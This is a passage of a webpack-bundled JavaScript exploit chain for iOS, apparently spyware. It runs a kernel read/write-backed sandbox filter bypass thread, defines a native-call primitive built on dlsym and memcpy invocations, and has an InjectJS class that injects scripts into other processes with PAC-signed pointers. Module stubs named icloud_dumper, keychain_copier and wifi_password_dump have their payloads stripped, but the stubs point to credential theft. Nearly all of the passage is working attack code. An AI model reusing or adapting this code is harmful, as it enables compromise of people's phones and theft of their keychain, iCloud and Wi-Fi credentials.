RUN_FLAG_PAUSE)\n\t\t\treturn RUN_FLAG_PAUSE;\n\n\t\tif (timeout && (Date.now() - startTimestamp >= timeout)) {\n\t\t\tconsole.log(TAG, \"Timeout waiting for a syscall\");\n\t\t\tbreak;\n\t\t}\n\n\t\tlet filterTriggered = false;\n\t\tlet monitorThread1 = monitorThread1Ptr ? libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(monitorThread1Ptr) : false;\n\t\tlet monitorThread2 = monitorThread2Ptr ? libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(monitorThread2Ptr) : false;\n\n\t\tif (monitorThread1 && monitorThread2) {\n\t\t\t//console.log(TAG, \"check monitored threads\");\n\t\t\tfilterTriggered |= disableFilterOnThread(monitorThread1);\n\t\t\tfilterTriggered |= disableFilterOnThread(monitorThread2);\n\t\t}\n\t\telse {\n\t\t\t//console.log(TAG, \"Waiting for monitored threads...\");\n\t\t}\n\t\t\n\t\tif (filterTriggered)\n\t\t\tbreak;\n\n\t\t//console.log(TAG, \"No MIG syscall detected\");\n\n\t\tlibs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].callSymbol(\"usleep\", 50000);\n\t}\n\t//console.log(TAG, \"MIG syscall intercepted!\");\n\treturn RUN_FLAG_RUN;\n}\n\nfunction startFilterBypass(runBypassFlagPtr) {\n\tlet run = RUN_FLAG_PAUSE;\n\n\tlet selfTaskAddr = libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_2__[\"default\"].gSelfTask.addr;\n\n\twhile (run) {\n\t\tif (run == RUN_FLAG_PAUSE) {\n\t\t\tconsole.log(TAG, \"Pausing filter bypass\");\n\t\t\twhile (true) {\n\t\t\t\trun = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read32(runBypassFlagPtr);\n\t\t\t\tif (run != RUN_FLAG_PAUSE) {\n\t\t\t\t\tif (run == RUN_FLAG_RUN)\n\t\t\t\t\t\tconsole.log(TAG, \"Resuming filter bypass\");\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tlibs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].callSymbol(\"usleep\", 100000);\n\t\t\t}\n\t\t}\n\n\t\t//console.log(TAG, \"Locking sandbox...\");\n\t\tlockSandboxLock();\n\t\t//console.log(TAG, \"Sandbox locked\");\n\n\t\trun = waitForMigSyscall(selfTaskAddr, runBypassFlagPtr, 5000);\n\n\t\tunlockSandboxLock();\n\t\t//console.log(TAG, \"Sandbox unlocked\");\n\n\t\tif (run)\n\t\t\tlibs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].callSymbol(\"sched_yield\");\n\t}\n}\n\ndisarm_gc();\n\n// Register log function\n//globalThis.LOG_POST_TO_FILE = false;\nconsole.log = libs_JSUtils_Logger__WEBPACK_IMPORTED_MODULE_5__[\"default\"].log;\n\nconsole.log(TAG, \"Thread initialized!\");\n\nlet kernelControlPtr = thread_arg;\nlet kernelRWPtr = thread_arg + 0x8n;\nlet kernelBasePtr = thread_arg + 0x10n;\nlet mainThreadAddrPtr = thread_arg + 0x18n;\nlet runBypassFlagPtr = thread_arg + 0x20n;\nlet isRunningPtr = thread_arg + 0x28n;\nlet mutexPtr = thread_arg + 0x30n;\nlet migLockPtr = thread_arg + 0x38n;\nlet migSbxMsgPtr = thread_arg + 0x40n;\nlet migKernelStackLRPtr = thread_arg + 0x48n;\nlet monitorThread1Ptr = thread_arg + 0x50n;\nlet monitorThread2Ptr = thread_arg + 0x58n;\n\nlet kernelControl = uread64(kernelControlPtr);\nlet kernelRW = uread64(kernelRWPtr);\nlet kernelBase = uread64(kernelBasePtr);\nlet mainThreadAddr = uread64(mainThreadAddrPtr);\nrunBypassFlagPtr = uread64(runBypassFlagPtr);\nisRunningPtr = uread64(isRunningPtr);\nlet mutex = uread64(mutexPtr);\nlet migLock = uread64(migLockPtr);\nlet migSbxMsg = uread64(migSbxMsgPtr);\nlet migKernelStackLR = uread64(migKernelStackLRPtr);\nmonitorThread1Ptr = uread64(monitorThread1Ptr);\nmonitorThread2Ptr = uread64(monitorThread2Ptr);\n\nconsole.log(TAG, \"kernelControl:     \" + kernelControl);\nconsole.log(TAG, \"kernelRW:          \" + kernelRW);\nconsole.log(TAG, \"kernelBase:        \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(kernelBase));\nconsole.log(TAG, \"mainThreadAddr:    \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(mainThreadAddr));\nconsole.log(TAG, \"runBypassFlagPtr:  \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(runBypassFlagPtr));\nconsole.log(TAG, \"isRunningPtr:      \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(isRunningPtr));\nconsole.log(TAG, \"mutex:             \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(mutex));\nconsole.log(TAG, \"migLock:           \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(migLock));\nconsole.log(TAG, \"migSbxMsg:         \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(migSbxMsg));\nconsole.log(TAG, \"migKernelStackLR:  \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(migKernelStackLR));\nconsole.log(TAG, \"monitorThread1Ptr: \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(monitorThread1Ptr));\nconsole.log(TAG, \"monitorThread2Ptr: \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(monitorThread2Ptr));\n\ntry {\n\tlet driver = new libs_Driver_DriverNewThread__WEBPACK_IMPORTED_MODULE_7__[\"default\"](kernelControl, kernelRW, kernelBase);\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].init(driver, mutex);\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].testKRW();\n\tlibs_TaskRop_TaskRop__WEBPACK_IMPORTED_MODULE_4__[\"default\"].init();\n\n\tconsole.log(TAG, \"Chain initialized\");\n\n\tlibs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write32(isRunningPtr, 1);\n\n\tstartFilterBypass(runBypassFlagPtr);\n\n\tconsole.log(TAG, \"Terminating bypass thread\");\n}\ncatch (error) {\n\tconsole.log(TAG, \"Error: \" + error);\n\tconsole.log(TAG, \"\" + error.stack);\n}\n})();\n\nvar __webpack_export_target__ = exports;\nfor(var __webpack_i__ in __webpack_exports__) __webpack_export_target__[__webpack_i__] = __webpack_exports__[__webpack_i__];\nif(__webpack_exports__.__esModule) Object.defineProperty(__webpack_export_target__, \"__esModule\", { value: true });\n/******/ })()\n;");

/***/ }),

/***/ "./node_modules/raw-loader/dist/cjs.js!./src/file_downloader.js":
/*!**********************************************************************!*\
  !*** ./node_modules/raw-loader/dist/cjs.js!./src/file_downloader.js ***!
  \**********************************************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
/* harmony export */ });
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("");  // STRIPPED: payload removed

/***/ }),

/***/ "./node_modules/raw-loader/dist/cjs.js!./src/icloud_dumper.js":
/*!********************************************************************!*\
  !*** ./node_modules/raw-loader/dist/cjs.js!./src/icloud_dumper.js ***!
  \********************************************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
/* harmony export */ });
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("");  // STRIPPED: payload removed

/***/ }),

/***/ "./node_modules/raw-loader/dist/cjs.js!./src/keychain_copier.js":
/*!**********************************************************************!*\
  !*** ./node_modules/raw-loader/dist/cjs.js!./src/keychain_copier.js ***!
  \**********************************************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
/* harmony export */ });
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("");  // STRIPPED: payload removed

/***/ }),

/***/ "./node_modules/raw-loader/dist/cjs.js!./src/loader.js":
/*!*************************************************************!*\
  !*** ./node_modules/raw-loader/dist/cjs.js!./src/loader.js ***!
  \*************************************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
/* harmony export */ });
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("class Native {\n\t\n\tstatic #baseAddr;\n\tstatic #dlsymAddr;\n\tstatic #memcpyAddr;\n\tstatic #mallocAddr;\n\tstatic #oinvAddr;\n\t\n\t// Preallocated memory chunk for general purpose stuff for public use\n\tstatic mem = 0n;\n\tstatic memSize = 0x4000;\n\t\n\t// Preallocated memory chunk for encoding/decoding of string arguments\n\tstatic #argMem = 0n;\n\tstatic #argMemPtr = 0n;\n\tstatic #argMemPtrStr = 0n;\n\t\n\t// Pointer to next available memory for native argument\n\tstatic #argPtr = 0n;\n\tstatic #argPtrPtr = 0n;\n\tstatic #argPtrStrPtr = 0n;\n\n\tstatic #dlsymCache = {};\n\t\n\tstatic init() {\n\t\tconst buff = new BigUint64Array(nativeCallBuff);\n\t\tthis.#baseAddr = buff[20];\n\t\tthis.#dlsymAddr = buff[21];\n\t\tthis.#memcpyAddr = buff[22];\n\t\tthis.#mallocAddr = buff[23];\n\t\tthis.#oinvAddr = buff[24];\n\t\t\n\t\t//log(\"baseAddr: \" + this.#baseAddr);\n\t\t//log(\"dlsymAddr: \" + this.#dlsymAddr);\n\t\t\n\t\t//this.#memcpyAddr = this.#dlsym(\"test\");\n\t\t//log(\"memcpyAddr: \" + this.#memcpyAddr);\n\t\t//log(\"oinvAddr: \" + this.#oinvAddr);\n\t\t\n\t\tthis.mem = this.#nativeCallAddr(this.#mallocAddr, BigInt(this.memSize)); //this.callSymbol(\"malloc\", this.memSize);\n\t\tthis.#argMem = this.#nativeCallAddr(this.#mallocAddr, 0x1000n); //this.callSymbol(\"malloc\", 0x1000);\n\t\tthis.#argMemPtr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n); //this.callSymbol(\"malloc\", 0x1000);\n\t\tthis.#argMemPtrStr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n); //this.callSymbol(\"malloc\", 0x1000);\n\t\tthis.#argPtr = this.#argMem;\n\t\tthis.#argPtrPtr = this.#argMemPtr;\n\t\tthis.#argPtrStrPtr = this.#argMemPtrStr;\n\t\t\n\t\t//log(\"argMem: \" + this.#argMem);\n\t\t//log(\"argMemPtr: \" + this.#argMemPtr);\n\t\t//log(\"argMemPtrStr: \" + this.#argMemPtrStr);\n\t}\n\t\n\tstatic write(ptr, buff) {\n\t\tif (!ptr)\n\t\t\treturn false;\n\t\t//log(\"write: \" + buff.byteLength);\n\t\tlet buff8 = new Uint8Array(nativeCallBuff);\n\t\tlet offs = 0;\n\t\tlet left = buff.byteLength;\n\t\twhile (left) {\n\t\t\tlet len = left;\n\t\t\tif (len > 0x1000)\n\t\t\t\tlen = 0x1000;\n\t\t\t//log(`writing: ptr=${ptr}, src=${Native.#baseAddr + 0x1000n}, offs=${offs}, len=${len}`);\n\t\t\tbuff8.set(new Uint8Array(buff, offs, len), 0x1000);\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, ptr + BigInt(offs), this.#baseAddr + 0x1000n, BigInt(len));\n\t\t\tleft -= len;\n\t\t\toffs += len;\n\t\t}\n\t\treturn true;\n\t}\n\t\n\tstatic read(ptr, length) {\n\t\tif (!ptr)\n\t\t\treturn null;\n\t\t//log(`read: ptr=${ptr}, length=${length}, ${typeof(length)}`, ptr, length);\n\t\tlet buff = new ArrayBuffer(length);\n\t\tlet buff8 = new Uint8Array(buff);\n\t\tlet offs = 0;\n\t\tlet left = length;\n\t\twhile (left) {\n\t\t\tlet len = left;\n\t\t\tif (len > 0x1000)\n\t\t\t\tlen = 0x1000;\n\t\t\t//log(`reading: ptr=${ptr}, dst=${Native.#baseAddr + 0x1000n}, offs=${offs}, len=${len}`);\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, this.#baseAddr + 0x1000n, ptr + BigInt(offs), BigInt(len));\n\t\t\tbuff8.set(new Uint8Array(nativeCallBuff, 0x1000, len), offs);\n\t\t\tleft -= len;\n\t\t\toffs += len;\n\t\t}\n\t\treturn buff;\n\t}\n\t\n\tstatic readPtr(ptr) {\n\t\tlet buff = this.read(ptr, 8);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getBigUint64(0, true);\n\t}\n\t\n\tstatic readString(ptr, len=1024) {\n\t\tlet buff = this.read(ptr, len);\n\t\treturn this.bytesToString(buff, false);\n\t}\n\t\n\tstatic writeString(ptr, str) {\n\t\tconst buff = this.stringToBytes(str, true);\n\t\tthis.write(ptr, buff);\n\t}\n\t\n\tstatic callSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\t//log(\"callSymbol: \" + name);\n\t\t// Initialize argPtr to point to general purpose memory chunk\n\t\tthis.#argPtr = this.#argMem;\n\t\tx0 = this.#toNative(x0);\n\t\tx1 = this.#toNative(x1);\n\t\tx2 = this.#toNative(x2);\n\t\tx3 = this.#toNative(x3);\n\t\tx4 = this.#toNative(x4);\n\t\tx5 = this.#toNative(x5);\n\t\tx6 = this.#toNative(x6);\n\t\tx7 = this.#toNative(x7);\n\t\tlet ret = this.#nativeCallSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7);\n\t\t// Reset argPtr\n\t\tthis.#argPtr = this.#argMem;\n\t\treturn ret;\n\t}\n\t\n\tstatic callSymbolRetain(name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\t//log(\"callSymbolRetain: \" + name);\n\t\t// Initialize argPtrPtr to point to general purpose memory chunk\n\t\tthis.#argPtrPtr = this.#argMemPtr;\n\t\tthis.#argPtrStrPtr = this.#argMemPtrStr;\n\t\tx0 = this.#toNativePtr(x0);\n\t\tx1 = this.#toNativePtr(x1);\n\t\tx2 = this.#toNativePtr(x2);\n\t\tx3 = this.#toNativePtr(x3);\n\t\tx4 = this.#toNativePtr(x4);\n\t\tx5 = this.#toNativePtr(x5);\n\t\tx6 = this.#toNativePtr(x6);\n\t\tx7 = this.#toNativePtr(x7);\n\t\tlet ret = this.#nativeCallSymbolRetain(name, x0, x1, x2, x3, x4, x5, x6, x7);\n\t\t// Reset argPtrPtr\n\t\tthis.#argPtrPtr = this.#argMemPtr;\n\t\tthis.#argPtrStrPtr = this.#argMemPtrStr;\n\t\treturn ret;\n\t}\n\n\tstatic bytesToString(bytes, includeNullChar=true) {\n\t\tlet bytes8 = new Uint8Array(bytes);\n\t\tlet str = \"\";\n\t\tfor (let i=0; i<bytes8.length; i++) {\n\t\t\tif (!includeNullChar && !bytes8[i])\n\t\t\t\tbreak;\n\t\t\tstr += String.fromCharCode(bytes8[i]);\n\t\t}\n\t\treturn str;\n\t}\n\t\n\tstatic stringToBytes(str, nullTerminated=false) {\n\t\tlet buff = new ArrayBuffer(str.length + (nullTerminated ? 1 : 0));\n\t\tlet s8 = new Uint8Array(buff);\n\t\tfor (let i=0; i<str.length; i++)\n\t\t\ts8[i] = str.charCodeAt(i);\n\t\tif (nullTerminated)\n\t\t\ts8[str.length] = 0x0;\n\t\treturn s8.buffer;\n\t}\n\t\n\tstatic #toNative(value) {\n\t\t//log(\"toNative: \" + typeof value);\n\t\t// Strings need to be manually written to native memory\n\t\tif (!value)\n\t\t\treturn 0n;\n\t\tif (typeof value === 'string') {\n\t\t\tif (value.length >= 0x1000) {\n\t\t\t\tlog('toNative(): arg string is too long');\n\t\t\t\treturn 0n;\n\t\t\t}\n\t\t\tlet ptr = this.#argPtr;\n\t\t\tthis.writeString(ptr, value);\n\t\t\tthis.#argPtr += BigInt(value.length + 1);\n\t\t\treturn ptr;\n\t\t}\n\t\telse if (typeof value === 'bigint') {\n\t\t\treturn value;\n\t\t}\n\t\telse\n\t\t\treturn BigInt(value);\n\t}\n\t\n\tstatic #toNativePtr(value) {\n\t\t//log(\"toNativePtr: \" + typeof value);\n\t\t// Strings need to be manually written to native memory\n\t\tif (!value)\n\t\t\treturn 0n;\n\t\tlet ptr = this.#argPtrPtr;\n\t\tif (typeof value === 'string') {\n\t\t\tif (value.length >= 0x1000) {\n\t\t\t\tlog('toNativePtr(): arg string is too long');\n\t\t\t\treturn 0n;\n\t\t\t}\n\t\t\tlet strPtr = this.#argPtrStrPtr;\n\t\t\tthis.writeString(strPtr, value);\n\t\t\tthis.#argPtrStrPtr += BigInt(value.length + 1);\n\t\t\tvalue = strPtr;\n\t\t}\n\t\telse if (typeof value !== 'bigint') {\n\t\t\tvalue = BigInt(value);\n\t\t}\n\t\tconst buff = new ArrayBuffer(8);\n\t\tconst view = new DataView(buff);\n\t\tview.setBigUint64(0, value, true);\n\t\tthis.write(ptr, buff);\n\t\tthis.#argPtrPtr += 8n;\n\t\treturn ptr;\n\t}\n\t\n\tstatic #dlsym(name) {\n\t\tif (!name)\n\t\t\treturn 0n;\n\t\tlet addr = this.#dlsymCache[name];\n\t\tif (addr)\n\t\t\treturn addr;\n\t\t//log(\"dlsym(): \" + name);\n\t\tconst RTLD_DEFAULT = 0xfffffffffffffffen;\n\t\tconst nameBytes = this.stringToBytes(name, true);\n\t\tlet buff8 = new Uint8Array(nativeCallBuff);\n\t\tbuff8.set(new Uint8Array(nameBytes), 0x1000);\n\t\taddr = this.#nativeCallAddr(this.#dlsymAddr, RTLD_DEFAULT, this.#baseAddr + 0x1000n);\n\t\tif (addr)\n\t\t\tthis.#dlsymCache[name] = addr;\n\t\treturn addr;\n\t}\n\t\n\tstatic #nativeCallAddr(addr, x0=0n, x1=0n, x2=0n, x3=0n, x4=0n, x5=0n, x6=0n, x7=0n) {\n\t\t//log(\"nativeCallAddr(): \" + addr);\n\t\tlet buff = new BigInt64Array(nativeCallBuff);\n\t\t\n\t\tbuff[0] = addr;\n\t\tbuff[100] = x0;\n\t\tbuff[101] = x1;\n\t\tbuff[102] = x2;\n\t\tbuff[103] = x3;\n\t\tbuff[104] = x4;\n\t\tbuff[105] = x5;\n\t\tbuff[106] = x6;\n\t\tbuff[107] = x7;\n\n\t\tinvoker();\n\t\t\n\t\treturn buff[200];\n\t}\n\t\n\tstatic #nativeCallSymbol(name, ...args) {\n\t\t//log(\"nativeCallSymbol(): \" + name);\n\t\tconst funcAddr = this.#dlsym(name);\n\t\tconst ret64 = this.#nativeCallAddr(funcAddr, ...args);\n\t\tif (ret64 < 0xffffffffn && ret64 > -0xffffffffn)\n\t\t\treturn Number(ret64);\n\t\treturn ret64;\n\t}\n\t\n\tstatic #nativeCallSymbolRetain(name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\t//log(\"nativeCallSymbolRetain(): \" + name);\n\t\tconst funcAddr = this.#dlsym(name);\n\t\t\n\t\tconst selRetainArguments = this.callSymbol(\"sel_registerName\", \"retainArguments\");\n\t\tconst selSetArgument = this.callSymbol(\"sel_registerName\", \"setArgument:atIndex:\");\n\t\tconst selInvokeUsingIMP = this.callSymbol(\"sel_registerName\", \"invokeUsingIMP:\");\n\t\tconst selGetReturnValue = this.callSymbol(\"sel_registerName\", \"getReturnValue:\");\n\t\t\n\t\tthis.callSymbol(\"objc_msgSend\", this.#oinvAddr, selRetainArguments);\n\t\t\n\t\tif (x0) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x0, 0);\n\t\tif (x1) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x1, 1);\n\t\tif (x2) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x2, 2);\n\t\tif (x3) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x3, 3);\n\t\tif (x4) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x4, 4);\n\t\tif (x5) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x5, 5);\n\t\tif (x6) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x6, 6);\n\t\tif (x7) this.callSymbol(\"objc_msgSend\", this.#oinvAddr, selSetArgument, x7, 7);\n\t\t\n\t\tthis.callSymbol(\"objc_msgSend\", this.#oinvAddr, selInvokeUsingIMP, funcAddr);\n\t\t\n\t\tthis.callSymbol(\"objc_msgSend\", this.#oinvAddr, selGetReturnValue, this.#argMemPtr);\n\t\tconst ret64 = this.readPtr(this.#argMemPtr);\n\t\tif (ret64 < 0xffffffffn && ret64 > -0xffffffffn)\n\t\t\treturn Number(ret64);\n\t\treturn ret64;\n\t}\n}\n\nfunction File(path) {\n\treturn path;\n}\n\nfunction log(msg) {\n\tif (logging)\n\t\treturn;\n\n\tlogging = true;\n\t\n\tconst data = Native.stringToBytes(msg + \"\\n\");\n\n\tconst O_WRONLY = 0x0001;\n\tconst O_APPEND = 0x0008;\n\tconst O_CREAT = 0x0200;\n\tconst flags = O_WRONLY | O_CREAT | O_APPEND;\n\tconst fd = Native.callSymbol(\"open\", File(logfile), flags, 0o644);\n\tif (fd < 0) {\n\t\tlogging = false;\n\t\treturn;\n\t}\n\n\t// For some reason file mode is not applied on open()\n\tNative.callSymbol(\"fchmod\", fd, 0o644);\n\n\tlet offs = 0;\n\tlet left = data.byteLength;\n\n\tconst buffSize = 0x4000;\n\tconst buffPtr = Native.callSymbol(\"malloc\", buffSize);\n\n\twhile (left) {\n\t\tconst size = left > buffSize ? buffSize : left;\n\t\tconst src8 = new Uint8Array(data, offs, size);\n\t\tconst dst8 = new Uint8Array(src8);\n\t\tNative.write(buffPtr, dst8.buffer);\n\t\tconst len = Native.callSymbol(\"write\", fd, buffPtr, size);\n\t\tif (!len || len < 0)\n\t\t\tbreak;\n\t\toffs += len;\n\t\tleft -= len;\n\t}\n\n\tNative.callSymbol(\"free\", buffPtr);\n\tNative.callSymbol(\"close\", fd);\n\n\tlogging = false;\n}\n\nvar logging = false;\nconst logfile = \"/private/var/mobile/Media/RemoteLog.log\";\n\nNative.init();\n\nNative.callSymbol(\"unlink\", File(logfile));\n");

/***/ }),

/***/ "./node_modules/raw-loader/dist/cjs.js!./src/wifi_password_dump.js":
/*!*************************************************************************!*\
  !*** ./node_modules/raw-loader/dist/cjs.js!./src/wifi_password_dump.js ***!
  \*************************************************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
/* harmony export */ });
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("");  // STRIPPED: payload removed

/***/ }),

/***/ "./node_modules/raw-loader/dist/cjs.js!./src/wifi_password_securityd.js":
/*!******************************************************************************!*\
  !*** ./node_modules/raw-loader/dist/cjs.js!./src/wifi_password_securityd.js ***!
  \******************************************************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__)
/* harmony export */ });
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ("");  // STRIPPED: payload removed

/***/ }),

/***/ "./src/InjectJS.js":
/*!*************************!*\
  !*** ./src/InjectJS.js ***!
  \*************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ InjectJS)
/* harmony export */ });
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/TaskRop/RemoteCall */ "./src/libs/TaskRop/RemoteCall.js");
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");




const TAG = "INJECTJS";

const RTLD_LAZY = 0x1;
const RTLD_DEFAULT = 0xfffffffffffffffen;

class InjectJS {

	task;
	#target;
	#injectCode;
	#migFilterBypass;
	#invokingAddr;
	#JSContextClass;
	#NSMethodSignatureClass;
	#NSInvocationClass;
	#invokeUsingIMPSel;

	constructor(target, injectCode, migFilterBypass=null) {
		this.#target = target;
		this.#injectCode = injectCode;
		this.#migFilterBypass = migFilterBypass;
		this.#invokingAddr = this.#findInvoking();

		this.#JSContextClass = Native.callSymbol("objc_getClass", "JSContext");
		this.#NSMethodSignatureClass = Native.callSymbol("objc_getClass", "NSMethodSignature");
		this.#NSInvocationClass = Native.callSymbol("objc_getClass", "NSInvocation");
		this.#invokeUsingIMPSel = Native.callSymbol("sel_registerName", "invokeUsingIMP:"); 

		if (!this.#invokingAddr)
			console.log(TAG, "Invoking not found!");
	}

	inject(agentPid=0) {
		if (!this.#invokingAddr)
			return false;

		if (typeof(this.#target) == "string") {
			console.log(TAG, `Start injecting JS script into ${this.#target}`);

			this.task = new libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_1__["default"](this.#target, this.#migFilterBypass);
			if (!this.task.success()) {
				console.log(TAG, "Unable to inject into: " + this.#target);
				return false;
			}
		}
		else {
			console.log(TAG, `Start injecting JS script into existing task: ${this.#target.pid()}`);

			 // Assume target is a RemoteCall object
			this.task = this.#target;
			if (!this.task.success()) {
				console.log(TAG, "Unable to inject into existing task");
				return false;
			}
		}

		this.#startWithTask(agentPid);
		return true;
	}

	destroy() {
		if (this.task && this.task.success())
			this.task.destroy();
		this.task = null;
	}

	#startWithTask(agentPid) {
		const mem = this.task.mem();
		const krwCtx = this.task.krwCtx();

		// Sign __invoking__ function address
		this.#invokingAddr = this.task.pac(this.#invokingAddr, 0);
		//console.log(TAG, "Signed invoking: " + Utils.hex(this.#invokingAddr));

		this.task.writeStr(mem, "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore");
		const lib = this.task.call(1000, "dlopen", mem, RTLD_LAZY);
		//console.log(TAG, "lib: " + Utils.hex(lib));

		// Create a JSC context and get pointer to exceptionHandler NSBlock
		const jscontext = this.#callObjcRetain(this.#JSContextClass, "new");
		//console.log(TAG, "Remote JSC: " + Utils.hex(jscontext));

		const exceptionHandler = this.task.read64(jscontext + 0x28n);
		//console.log(TAG, "Exception handler: " + Utils.hex(exceptionHandler));

		// Register an "invoker()" JS function within our JSC context, having exceptionHandler block as native implementation.
		// We replace exceptionHandler NSInvocation later in this code.
		const invokerStr = this.#writeCFStr(mem, "invoker");
		this.#callObjc(jscontext, "setObject:forKeyedSubscript:", exceptionHandler, invokerStr);
		//console.log(TAG, "invokerStr: " + Utils.hex(invokerStr));

		// Retrieve JSValue of invoker inside JSC context dict
		const invoker = this.#callObjc(jscontext, "objectForKeyedSubscript:", invokerStr);
		//console.log(TAG, "invoker: " + Utils.hex(invoker));

		// Get pointer of NSInvocation inside NSBlock
		const fjval = this.task.read64(invoker + 0x8n);
		const storval = this.task.read64(fjval + 0x40n);
		const invokerObj = this.task.read64(storval + 0x10n);
		//console.log(TAG, "invokerObj: " + Utils.hex(invokerObj));

		this.task.writeStr(mem, "QQQQQQQQQQQQQQQ");
		const lsignature = this.#callObjc(this.#NSMethodSignatureClass, "signatureWithObjCTypes:", mem);

		this.task.writeStr(mem, "@QQQQQQQQQQQQQQ");
		const osignature = this.#callObjc(this.#NSMethodSignatureClass, "signatureWithObjCTypes:", mem);

		// This is an utility NSInvocation object we share with JS to allow objc call with retained return object
		const oinv = this.#callObjcRetain(this.#NSInvocationClass, "invocationWithMethodSignature:", osignature);

		// This is the final NSInvocation object we use to call the actual target function
		const inv = this.#callObjcRetain(this.#NSInvocationClass, "invocationWithMethodSignature:", lsignature);
		//console.log(TAG, "inv: " + Utils.hex(inv));

		// Create a new NSInvocation and replace the NSBlock one with this
		const jsinv = this.#callObjcRetain(this.#NSInvocationClass, "invocationWithMethodSignature:", lsignature);
		//console.log(TAG, "jsinv: " + Utils.hex(jsinv));

		const callBuff = this.task.call(100, "calloc", 1, 0x4000);
		const firstInvokingBuff = callBuff + 0x50n;	// callBuff[10]
		const argsBuff = callBuff + 0x320n;			// callBuff[100]
		const resultBuff = callBuff + 0x640n;		// callBuff[200]

		//console.log(TAG, "callBuff: " + Utils.hex(callBuff));
		//console.log(TAG, "firstInvokingBuff: " + Utils.hex(firstInvokingBuff));
		//console.log(TAG, "argsBuff: " + Utils.hex(argsBuff));
		//console.log(TAG, "resultBuff: " + Utils.hex(resultBuff));

		// Share callBuff with JS
		this.task.writeStr(mem, "nativeCallBuff");
		const jsctx = this.#callObjc(jscontext, "JSGlobalContextRef");
